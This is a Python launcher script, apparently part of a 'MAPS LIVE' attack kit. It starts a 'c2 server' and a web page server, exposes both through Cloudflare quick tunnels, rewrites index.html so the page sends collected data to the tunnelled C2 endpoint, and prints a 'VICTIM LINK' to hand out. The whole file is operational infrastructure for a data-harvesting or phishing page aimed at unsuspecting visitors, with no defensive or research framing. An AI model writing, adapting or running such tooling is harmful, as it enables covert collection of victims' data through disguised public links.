#!/usr/bin/env python3
"""
launcher.py — start c2 + page + two cloudflare tunnels, auto-update index.html.

run:  python launcher.py
stop: ctrl-c  (kills all children)
"""

import os
import re
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path

# ------------------------------------------------------------------ config
ROOT = Path(__file__).parent.resolve()
INDEX = ROOT / "index.html"
C2_PORT = 8080
PAGE_PORT = 3000
CLOUDFLARED = ROOT / "cloudflared.exe" if os.name == "nt" else ROOT / "cloudflared"
PYTHON = sys.executable

# ------------------------------------------------------------------ helpers

procs = []


def popen(cmd, cwd=None, stdout_pipe=True):
    """start a subprocess, stream its stdout in a thread, return (proc, reader)."""
    print(f"[spawn] {' '.join(cmd)}")
    kwargs = dict(
        cwd=str(cwd) if cwd else None,
        stdout=subprocess.PIPE if stdout_pipe else None,
        stderr=subprocess.STDOUT if stdout_pipe else None,
        bufsize=1,
        text=True,
    )
    if os.name == "nt":
        # new process group so ctrl-c doesn't nuke the child weirdly
        kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
    p = subprocess.Popen(cmd, **kwargs)
    procs.append(p)
    return p


def wait_for_url(proc, timeout=30):
    """read cloudflared stdout until a trycloudflare url appears."""
    url_re = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
    found = {"url": None}

    def reader():
        for line in proc.stdout:
            line = line.rstrip()
            if line:
                print(f"    | {line}")
            m = url_re.search(line)
            if m and not found["url"]:
                found["url"] = m.group(0)

    t = threading.Thread(target=reader, daemon=True)
    t.start()

    deadline = time.time() + timeout
    while time.time() < deadline:
        if found["url"]:
            return found["url"]
        if proc.poll() is not None:
            raise RuntimeError("cloudflared exited before url appeared")
        time.sleep(0.2)
    raise TimeoutError(f"no trycloudflare url after {timeout}s")


def update_index(new_url: str):
    """replace const SERVER = "..." with new_url in index.html."""
    if not INDEX.exists():
        print(f"[!] {INDEX} not found, skipping rewrite")
        return
    text = INDEX.read_text(encoding="utf-8")
    pattern = re.compile(r'(const\s+SERVER\s*=\s*)"[^"]*"')
    if not pattern.search(text):
        print(f"[!] no const SERVER line found in index.html")
        return
    new_text, n = pattern.subn(rf'\1"{new_url}"', text)
    INDEX.write_text(new_text, encoding="utf-8")
    print(f"[ok] index.html updated -> {new_url}  ({n} replacement)")


def cleanup(*_):
    print("\n[!] shutting down...")
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass
    time.sleep(1)
    for p in procs:
        try:
            if p.poll() is None:
                p.kill()
        except Exception:
            pass
    sys.exit(0)


# ------------------------------------------------------------------ main

def main():
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    if not CLOUDFLARED.exists():
        print(f"[!] cloudflared not found at {CLOUDFLARED}")
        sys.exit(1)

    print("=" * 60)
    print(" MAPS LIVE - python launcher")
    print("=" * 60)

    # 1. c2 server
    print("\n[1] starting c2 server on :%d" % C2_PORT)
    popen([PYTHON, "server.py"], cwd=ROOT, stdout_pipe=False)
    time.sleep(2)

    # 2. page server
    print("\n[2] starting page server on :%d" % PAGE_PORT)
    popen([PYTHON, "-m", "http.server", str(PAGE_PORT)], cwd=ROOT, stdout_pipe=False)
    time.sleep(1)

    # 3. data tunnel
    print("\n[3] starting data tunnel (8080)")
    data_proc = popen(
        [str(CLOUDFLARED), "tunnel", "--url", f"http://localhost:{C2_PORT}"],
        cwd=ROOT,
    )
    data_url = wait_for_url(data_proc)
    print(f"\n[ok] DATA URL   : {data_url}\n")

    # 4. page tunnel
    print("[4] starting page tunnel (3000)")
    page_proc = popen(
        [str(CLOUDFLARED), "tunnel", "--url", f"http://localhost:{PAGE_PORT}"],
        cwd=ROOT,
    )
    page_url = wait_for_url(page_proc)
    print(f"\n[ok] PAGE URL   : {page_url}\n")

    # 5. rewrite index.html
    print("[5] rewriting index.html")
    update_index(data_url)

    # 6. done
    print("\n" + "=" * 60)
    print(" READY")
    print("=" * 60)
    print(f" DATA URL    : {data_url}")
    print(f" VICTIM LINK : {page_url}")
    print("=" * 60)
    print("\nctrl-c to stop everything.\n")

    # keep alive
    try:
        while True:
            time.sleep(1)
            for p in procs:
                if p.poll() is not None:
                    print(f"[!] a child process exited (rc={p.returncode}), shutting down")
                    cleanup()
    except KeyboardInterrupt:
        cleanup()


if __name__ == "__main__":
    main()